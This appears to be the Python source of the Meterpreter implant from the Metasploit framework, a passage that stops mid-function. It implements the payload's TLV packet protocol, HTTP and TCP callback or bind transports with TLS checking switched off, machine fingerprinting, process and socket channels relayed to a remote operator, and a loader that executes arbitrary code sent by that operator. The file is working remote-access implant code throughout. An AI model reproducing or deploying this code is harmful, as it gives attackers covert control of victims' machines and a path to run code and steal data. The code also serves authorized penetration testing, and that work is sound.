#!/usr/bin/python
# vim: tabstop=4 softtabstop=4 shiftwidth=4 noexpandtab
import binascii
import code
import os
import platform
import random
import select
import socket
import struct
import subprocess
import sys
import threading
import time
import traceback

try:
	import ctypes
except ImportError:
	has_windll = False
else:
	has_windll = hasattr(ctypes, 'windll')

# this MUST be imported for urllib to work on OSX
try:
	import SystemConfiguration as osxsc
	osxsc.SCNetworkInterfaceCopyAll()
	has_osxsc = True
except ImportError:
	has_osxsc = False

try:
	urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
	if sys.version_info[0] < 3:
		urllib = __import__('urllib2', fromlist=urllib_imports)
	else:
		urllib = __import__('urllib.request', fromlist=urllib_imports)
except ImportError:
	has_urllib = False
else:
	has_urllib = True

if sys.version_info[0] < 3:
	is_str = lambda obj: issubclass(obj.__class__, str)
	is_bytes = lambda obj: issubclass(obj.__class__, str)
	bytes = lambda *args: str(*args[:1])
	NULL_BYTE = '\x00'
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
	if isinstance(__builtins__, dict):
		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
		str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	else:
		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
		str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
	NULL_BYTE = bytes('\x00', 'UTF-8')
	long = int
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)

#
# Constants
#

# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = False
HTTP_CONNECTION_URL = None
HTTP_PROXY = None
HTTP_USER_AGENT = None
PAYLOAD_UUID = ''
SESSION_COMMUNICATION_TIMEOUT = 300
SESSION_EXPIRATION_TIMEOUT = 604800
SESSION_RETRY_TOTAL = 3600
SESSION_RETRY_WAIT = 10

PACKET_TYPE_REQUEST        = 0
PACKET_TYPE_RESPONSE       = 1
PACKET_TYPE_PLAIN_REQUEST  = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1
ERROR_FAILURE_PYTHON = 2
ERROR_FAILURE_WINDOWS = 3

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM   = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL     = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED   = 0
TLV_EXTENSIONS = 20000
TLV_USER       = 40000
TLV_TEMP       = 60000

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54
TLV_TYPE_CHANNEL_PARENTID      = TLV_META_TYPE_UINT    | 55

TLV_TYPE_SEEK_WHENCE           = TLV_META_TYPE_UINT    | 70
TLV_TYPE_SEEK_OFFSET           = TLV_META_TYPE_UINT    | 71
TLV_TYPE_SEEK_POS              = TLV_META_TYPE_UINT    | 72

TLV_TYPE_EXCEPTION_CODE        = TLV_META_TYPE_UINT    | 300
TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301

TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401
TLV_TYPE_MIGRATE_PID           = TLV_META_TYPE_UINT    | 402
TLV_TYPE_MIGRATE_LEN           = TLV_META_TYPE_UINT    | 403

TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 441

TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461

TLV_TYPE_CIPHER_NAME           = TLV_META_TYPE_STRING  | 500
TLV_TYPE_CIPHER_PARAMETERS     = TLV_META_TYPE_GROUP   | 501

TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503

EXPORTED_SYMBOLS = {}
EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING

def export(symbol):
	EXPORTED_SYMBOLS[symbol.__name__] = symbol
	return symbol

def generate_request_id():
	chars = 'abcdefghijklmnopqrstuvwxyz'
	return ''.join(random.choice(chars) for x in range(32))

@export
def crc16(data):
	poly = 0x1021
	reg = 0x0000
	if is_str(data):
		data = list(map(ord, data))
	elif is_bytes(data):
		data = list(data)
	data.append(0)
	data.append(0)
	for byte in data:
		mask = 0x80
		while mask > 0:
			reg <<= 1
			if byte & mask:
				reg += 1
			mask >>= 1
			if reg > 0xffff:
				reg &= 0xffff
				reg ^= poly
	return reg

@export
def error_result(exception=None):
	if not exception:
		_, exception, _ = sys.exc_info()
	exception_crc = crc16(exception.__class__.__name__)
	if exception_crc == 0x4cb2: # WindowsError
		return error_result_windows(exception.errno)
	else:
		result = ((exception_crc << 16) | ERROR_FAILURE_PYTHON)
	return result

@export
def error_result_windows(error_number=None):
	if not has_windll:
		return ERROR_FAILURE
	if error_number == None:
		error_number = ctypes.windll.kernel32.GetLastError()
	if error_number > 0xffff:
		return ERROR_FAILURE
	result = ((error_number << 16) | ERROR_FAILURE_WINDOWS)
	return result

@export
def get_hdd_label():
	for _, _, files in os.walk('/dev/disk/by-id/'):
		for f in files:
			for p in ['ata-', 'mb-']:
				if f[:len(p)] == p:
					return f[len(p):]
	return ''

@export
def inet_pton(family, address):
	if hasattr(socket, 'inet_pton'):
		return socket.inet_pton(family, address)
	elif has_windll:
		WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
		lpAddress = (ctypes.c_ubyte * 28)()
		lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
		if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
			raise Exception('WSAStringToAddress failed')
		if family == socket.AF_INET:
			return ''.join(map(chr, lpAddress[4:8]))
		elif family == socket.AF_INET6:
			return ''.join(map(chr, lpAddress[8:24]))
	raise Exception('no suitable inet_pton functionality is available')

@export
def packet_enum_tlvs(pkt, tlv_type = None):
	offset = 0
	while (offset < len(pkt)):
		tlv = struct.unpack('>II', pkt[offset:offset+8])
		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
				val = str(val.split(NULL_BYTE, 1)[0])
			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
				val = struct.unpack('>I', val)[0]
			elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
				val = struct.unpack('>Q', val)[0]
			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
				val = bool(struct.unpack('b', val)[0])
			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
				pass
			yield {'type':tlv[1], 'length':tlv[0], 'value':val}
		offset += tlv[0]
	raise StopIteration()

@export
def packet_get_tlv(pkt, tlv_type):
	try:
		tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
	except IndexError:
		return {}
	return tlv

@export
def tlv_pack(*args):
	if len(args) == 2:
		tlv = {'type':args[0], 'value':args[1]}
	else:
		tlv = args[0]
	data = ''
	value = tlv['value']
	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
		if isinstance(value, float):
			value = int(round(value))
		data = struct.pack('>III', 12, tlv['type'], value)
	elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
		data = struct.pack('>IIQ', 16, tlv['type'], value)
	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(value))), 'UTF-8')
	else:
		if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
			value = value.encode('UTF-8')
		elif not is_bytes(value):
			value = bytes(value, 'UTF-8')
		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
		elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
		elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
	return data

@export
def tlv_pack_response(result, response):
	response += tlv_pack(TLV_TYPE_RESULT, result)
	response = struct.pack('>I', len(response) + 4) + response
	return response

#@export
class MeterpreterFile(object):
	def __init__(self, file_obj):
		self.file_obj = file_obj

	def __getattr__(self, name):
		return getattr(self.file_obj, name)
export(MeterpreterFile)

#@export
class MeterpreterSocket(object):
	def __init__(self, sock):
		self.sock = sock

	def __getattr__(self, name):
		return getattr(self.sock, name)
export(MeterpreterSocket)

#@export
class MeterpreterSocketClient(MeterpreterSocket):
	pass
export(MeterpreterSocketClient)

#@export
class MeterpreterSocketServer(MeterpreterSocket):
	pass
export(MeterpreterSocketServer)

class STDProcessBuffer(threading.Thread):
	def __init__(self, std, is_alive):
		threading.Thread.__init__(self)
		self.std = std
		self.is_alive = is_alive
		self.data = bytes()
		self.data_lock = threading.RLock()

	def run(self):
		for byte in iter(lambda: self.std.read(1), bytes()):
			self.data_lock.acquire()
			self.data += byte
			self.data_lock.release()

	def is_read_ready(self):
		return len(self.data) != 0

	def peek(self, l = None):
		data = bytes()
		self.data_lock.acquire()
		if l == None:
			data = self.data
		else:
			data = self.data[0:l]
		self.data_lock.release()
		return data

	def read(self, l = None):
		self.data_lock.acquire()
		data = self.peek(l)
		self.data = self.data[len(data):]
		self.data_lock.release()
		return data

#@export
class STDProcess(subprocess.Popen):
	def __init__(self, *args, **kwargs):
		subprocess.Popen.__init__(self, *args, **kwargs)
		self.echo_protection = False

	def start(self):
		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
		self.stdout_reader.start()
		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
		self.stderr_reader.start()

	def write(self, channel_data):
		self.stdin.write(channel_data)
		self.stdin.flush()
		if self.echo_protection:
			end_time = time.time() + 0.5
			out_data = bytes()
			while (time.time() < end_time) and (out_data != channel_data):
				if self.stdout_reader.is_read_ready():
					out_data = self.stdout_reader.peek(len(channel_data))
			if out_data == channel_data:
				self.stdout_reader.read(len(channel_data))
export(STDProcess)

class Transport(object):
	def __init__(self):
		self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
		self.communication_last = 0
		self.retry_total = SESSION_RETRY_TOTAL
		self.retry_wait = SESSION_RETRY_WAIT
		self.request_retire = False

	def __repr__(self):
		return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)

	@property
	def communication_has_expired(self):
		return self.communication_last + self.communication_timeout < time.time()

	@property
	def should_retire(self):
		return self.communication_has_expired or self.request_retire

	@staticmethod
	def from_request(request):
		url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
		if url.startswith('tcp'):
			transport = TcpTransport(url)
		elif url.startswith('http'):
			proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
			user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
			transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
		transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
		transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
		return transport

	def _activate(self):
		return True

	def activate(self):
		end_time = time.time() + self.retry_total
		while time.time() < end_time:
			try:
				activate_succeeded = self._activate()
			except:
				activate_succeeded = False
			if activate_succeeded:
				self.communication_last = time.time()
				return True
			time.sleep(self.retry_wait)
		return False

	def _deactivate(self):
		return

	def deactivate(self):
		try:
			self._deactivate()
		except:
			pass
		self.communication_last = 0
		return True

	def get_packet(self):
		self.request_retire = False
		try:
			pkt = self._get_packet()
		except:
			return None
		if pkt is None:
			return None
		self.communication_last = time.time()
		return pkt

	def send_packet(self, pkt):
		self.request_retire = False
		try:
			self._send_packet(pkt)
		except:
			return False
		self.communication_last = time.time()
		return True

	def tlv_pack_timeouts(self):
		response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
		response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
		response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
		return response

	def tlv_pack_transport_group(self):
		trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
		trans_group += self.tlv_pack_timeouts()
		return trans_group

class HttpTransport(Transport):
	def __init__(self, url, proxy=None, user_agent=None):
		super(HttpTransport, self).__init__()
		opener_args = []
		scheme = url.split(':', 1)[0]
		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
			import ssl
			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
			ssl_ctx.check_hostname = False
			ssl_ctx.verify_mode = ssl.CERT_NONE
			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
		if proxy:
			opener_args.append(urllib.ProxyHandler({scheme: proxy}))
		self.proxy = proxy
		opener = urllib.build_opener(*opener_args)
		if user_agent:
			opener.addheaders = [('User-Agent', user_agent)]
		self.user_agent = user_agent
		urllib.install_opener(opener)
		self.url = url
		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
		self._first_packet = None
		self._empty_cnt = 0

	def _activate(self):
		return True
		self._first_packet = None
		packet = self._get_packet()
		if packet is None:
			return False
		self._first_packet = packet
		return True

	def _get_packet(self):
		if self._first_packet:
			packet = self._first_packet
			self._first_packet = None
			return packet
		packet = None
		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
		packet = url_h.read()
		for _ in range(1):
			if packet == '':
				break
			if len(packet) < 8:
				packet = None  # looks corrupt
				break
			pkt_length, _ = struct.unpack('>II', packet[:8])
			if len(packet) != pkt_length:
				packet = None  # looks corrupt
		if not packet:
			delay = 10 * self._empty_cnt
			if self._empty_cnt >= 0:
				delay *= 10
			self._empty_cnt += 1
			time.sleep(float(min(10000, delay)) / 1000)
			return packet
		self._empty_cnt = 0
		return packet[8:]

	def _send_packet(self, packet):
		request = urllib.Request(self.url, packet, self._http_request_headers)
		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
		response = url_h.read()

	def tlv_pack_transport_group(self):
		trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
		if self.user_agent:
			trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
		if self.proxy:
			trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
		return trans_group

class TcpTransport(Transport):
	def __init__(self, url, socket=None):
		super(TcpTransport, self).__init__()
		self.url = url
		self.socket = socket
		self._cleanup_thread = None
		self._first_packet = True

	def _sock_cleanup(self, sock):
		remaining_time = self.communication_timeout
		while remaining_time > 0:
			iter_start_time = time.time()
			if select.select([sock], [], [], remaining_time)[0]:
				if len(sock.recv(4096)) == 0:
					break
			remaining_time -= time.time() - iter_start_time
		sock.close()

	def _activate(self):
		address, port = self.url[6:].rsplit(':', 1)
		port = int(port.rstrip('/'))
		timeout = max(self.communication_timeout, 30)
		if address in ('', '0.0.0.0', '::'):
			try:
				server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
				server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
			except (AttributeError, socket.error):
				server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server_sock.bind(('', port))
			server_sock.listen(1)
			if not select.select([server_sock], [], [], timeout)[0]:
				server_sock.close()
				return False
			sock, _ = server_sock.accept()
			server_sock.close()
		else:
			if ':' in address:
				sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
			else:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(timeout)
			sock.connect((address, port))
			sock.settimeout(None)
		self.socket = sock
		self._first_packet = True
		return True

	def _deactivate(self):
		cleanup = threading.Thread(target=self._sock_cleanup, args=(self.socket,))
		cleanup.run()
		self.socket = None

	def _get_packet(self):
		first = self._first_packet
		self._first_packet = False
		if not select.select([self.socket], [], [], 0.5)[0]:
			return ''
		packet = self.socket.recv(8)
		if packet == '':  # remote is closed
			self.request_retire = True
			return None
		if len(packet) != 8:
			if first and len(packet) == 4:
				received = 0
				pkt_length = struct.unpack('>I', packet)[0]
				self.socket.settimeout(max(self.communication_timeout, 30))
				while received < pkt_length:
					received += len(self.socket.recv(pkt_length - received))
				self.socket.settimeout(None)
				return self._get_packet()
			return None
		pkt_length, pkt_type = struct.unpack('>II', packet)
		pkt_length -= 8
		packet = bytes()
		while len(packet) < pkt_length:
			packet += self.socket.recv(pkt_length - len(packet))
		return packet

	def _send_packet(self, packet):
		self.socket.send(packet)

	@classmethod
	def from_socket(cls, sock):
		url = 'tcp://'
		address, port = sock.getsockname()[:2]
		# this will need to be changed if the bind stager ever supports binding to a specific address
		if not address in ('', '0.0.0.0', '::'):
			address, port = sock.getpeername()[:2]
		url += address + ':' + str(port)
		return cls(url, sock)

class PythonMeterpreter(object):
	def __init__(self, transport):
		self.transport = transport
		self.running = False
		self.last_registered_extension = None
		self.extension_functions = {}
		self.channels = {}
		self.interact_channels = []
		self.processes = {}
		self.transports = [self.transport]
		self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
		self.session_expiry_end = time.time() + self.session_expiry_time
		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
			self.extension_functions[func[1:]] = getattr(self, func)
		self.running = True

	def debug_print(self, msg):
		if DEBUGGING:
			print(msg)

	def register_extension(self, extension_name):
		self.last_registered_extension = extension_name
		return self.last_registered_extension

	def register_function(self, func):
		self.extension_functions[func.__name__] = func
		return func

	def register_function_windll(self, func):
		if has_windll:
			self.register_function(func)
		return func

	def add_channel(self, channel):
		assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
		idx = 0
		while idx in self.channels:
			idx += 1
		self.channels[idx] = channel
		return idx

	def add_process(self, process):
		idx = 0
		while idx in self.processes:
			idx += 1
		self.processes[idx] = process
		return idx

	def get_packet(self):
		pkt = self.transport.get_packet()
		if pkt is None and self.transport.should_retire:
			self.transport_change()
		return pkt

	def send_packet(self, packet):
		send_succeeded = self.transport.send_packet(packet)
		if not send_succeeded and self.transport.should_retire:
			self.transport_change()
		return send_succeeded

	@property
	def session_has_expired(self):
		if self.session_expiry_time == 0:
			return False
		return time.time() > self.session_expiry_end

	def transport_add(self, new_transport):
		new_position = self.transports.index(self.transport)
		self.transports.insert(new_position, new_transport)

	def transport_change(self, new_transport=None):
		if new_transport is None:
			new_transport = self.transport_next()
		self.transport.deactivate()
		self.debug_print('[*] changing transport to: ' + new_transport.url)
		while not new_transport.activate():
			new_transport = self.transport_next(new_transport)
			self.debug_print('[*] changing transport to: ' + new_transport.url)
		self.transport = new_transport

	def transport_next(self, current_transport=None):
		if current_transport is None:
			current_transport = self.transport
		new_idx = self.transports.index(current_transport) + 1
		if new_idx == len(self.transports):
			new_idx = 0
		return self.transports[new_idx]

	def transport_prev(self, current_transport=None):
		if current_transport is None:
			current_transport = self.transport
		new_idx = self.transports.index(current_transport) - 1
		if new_idx == -1:
			new_idx = len(self.transports) - 1
		return self.transports[new_idx]

	def run(self):
		while self.running and not self.session_has_expired:
			request = self.get_packet()
			if request:
				response = self.create_response(request)
				if response:
					self.send_packet(response)
				continue
			# iterate over the keys because self.channels could be modified if one is closed
			channel_ids = list(self.channels.keys())
			for channel_id in channel_ids:
				channel = self.channels[channel_id]
				data = bytes()
				if isinstance(channel, STDProcess):
					if not channel_id in self.interact_channels:
						continue
					if channel.stderr_reader.is_read_ready():
						data = channel.stderr_reader.read()
					elif channel.stdout_reader.is_read_ready():
						data = channel.stdout_reader.read()
					elif channel.poll() != None:
						self.handle_dead_resource_channel(channel_id)
				elif isinstance(channel, MeterpreterSocketClient):
					while select.select([channel.fileno()], [], [], 0)[0]:
						try:
							d = channel.recv(1)
						except socket.error:
							d = bytes()
						if len(d) == 0:
							self.handle_dead_resource_channel(channel_id)
							break
						data += d
				elif isinstance(channel, MeterpreterSocketServer):
					if select.select([channel.fileno()], [], [], 0)[0]:
						(client_sock, client_addr) = channel.accept()
						server_addr = channel.getsockname()
						client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
						pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
						pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
						pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
						pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
						pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
						pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
						self.send_packet(pkt)
				if data:
					pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
					pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
					pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
					pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
					pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
					pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
					pkt  = struct.pack('>I', len(pkt) + 4) + pkt
					self.send_packet(pkt)

	def handle_dead_resource_channel(self, channel_id):
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
		pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
		self.send_packet(pkt)

	def _core_uuid(self, request, response):
		response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
		return ERROR_SUCCESS, response

	def _core_enumextcmd(self, request, response):
		extension_name = packet_get_tlv(request, TLV_TYPE_STRING)['value']
		for func_name in self.extension_functions.keys():
			if func_name.split('_', 1)[0] == extension_name:
				response += tlv_pack(TLV_TYPE_STRING, func_name)
		return ERROR_SUCCESS, response

	def _core_machine_id(self, request, response):
		serial = ''
		machine_name = platform.uname()[1]
		if has_windll:
			from ctypes import wintypes

			k32 = ctypes.windll.kernel32
			sys_dir = ctypes.create_unicode_buffer(260)
			if not k32.GetSystemDirectoryW(ctypes.byref(sys_dir), 260):
				return ERROR_FAILURE_WINDOWS

			vol_buf = ctypes.create_unicode_buffer(260)
			fs_buf = ctypes.create_unicode_buffer(260)
			serial_num = wintypes.DWORD(0)

			if not k32.GetVolumeInformationW(ctypes.c_wchar_p(sys_dir.value[:3]),
					vol_buf, ctypes.sizeof(vol_buf), ctypes.byref(serial_num), None,
					None, fs_buf, ctypes.sizeof(fs_buf)):
				return ERROR_FAILURE_WINDOWS
			serial_num = serial_num.value
			serial = "{0:04x}-{1:04x}".format((serial_num >> 16) & 0xFFFF, serial_num & 0xFFFF)
		else:
			serial = get_hdd_label()

		response += tlv_pack(TLV_TYPE_MACHINE_ID, "%s:%s" % (serial, machine_name))
		return ERROR_SUCCESS, response

	def _core_loadlib(self, request, response):
		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
			return ERROR_FAILURE

		self.last_registered_extension = None
		symbols_for_extensions = {'meterpreter':self}
		symbols_for_extensions.update(EXPORTED_SYMBOLS)
		i = code.InteractiveInterpreter(symbols_for_extensions)
		i.runcode(compile(data_tlv['value'], '', 'exec'))
		extension_name = self.last_registered_extension

		if extension_name:
			check_extension = lambda x: x.startswith(extension_name)
			lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
			for method in lib_methods:
				response += tlv_pack(TLV_TYPE_METHOD, method)
		return ERROR_SUCCESS, response

	def _core_shutdown(self, request, response):
		response += tlv_pack(TLV_TYPE_BOOL, True)
		self.running = False
		return ERROR_SUCCESS, response

	def _core_transport_add(self, request, response):
		new_transport = Transport.from_request(request)
		self.transport_add(new_transport)
		return ERROR_SUCCESS, response

	def _core_transport_change(self, request, response):
		new_transport = Transport.from_request(request)
		self.transport_add(new_transport)
		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
		self.transport_change(new_transport)
		return None

	def _core_transport_list(self, request, response):
		if self.session_expiry_time > 0:
			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
		response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())

		transport = self.transport_next()
		while transport != self.transport:
			response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
			transport = self.transport_next(transport)
		return ERROR_SUCCESS, response

	def _core_transport_next(self, request, response):
		new_transport = self.transport_next()
		if new_transport == self.transport:
			return ERROR_FAILURE, response
		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
		self.transport_change(new_transport)
		return None

	def _core_transport_prev(self, request, response):
		new_transport = self.transport_prev()
		if new_transport == self.transport:
			return ERROR_FAILURE, response
		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
		self.transport_change(new_transport)
		return None

	def _core_transport_remove(self, request, response):
		url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
		if self.transport.url == url:
			return ERROR_FAILURE, response
		transport_found = False
		for transport in self.transports:
			if transport.url == url:
				transport_found = True
				break
		if transport_found:
			self.transports.remove(transport)
			return ERROR_SUCCESS, response
		return ERROR_FAILURE, response

	def _core_transport_set_timeouts(self, request, response):
		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
		if not timeout_value is None:
